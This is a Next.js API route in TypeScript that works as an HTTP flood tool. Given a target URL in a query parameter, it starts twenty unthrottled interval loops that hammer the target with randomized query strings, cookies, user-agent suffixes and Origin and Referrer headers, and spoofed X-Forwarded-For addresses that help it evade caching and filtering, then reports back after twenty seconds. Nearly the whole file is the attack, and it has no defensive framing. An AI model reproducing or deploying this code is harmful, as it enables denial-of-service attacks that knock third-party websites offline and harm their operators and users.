import type { NextApiRequest, NextApiResponse } from 'next'

type ResponseData = {
    message: string
}


const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l: number) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

export default function handler(
    req: NextApiRequest,
    res: NextApiResponse<ResponseData>
) {

    for (var i = 0; i < 20; i++) {
        setInterval(() => {
            fetch(`${req.query.name}?ref=${rStr(10)}`, {
                headers: {
                    'User-Agent': `Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko ${rStr(10)}`,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '1',
                    'cookie': `key=${rStr(10)}`,
                    'Origin': 'http://' + rStr(8) + '.com',
                    'Referrer': 'http://google.com/' + rStr(10),
                    'X-Forwarded-For': rIp()
                }
            }).then()
        })
    }

    setTimeout(() => {
        res.status(200).json({ message: `JK-${req.query.name}` })
    }, 20 * 1000)
}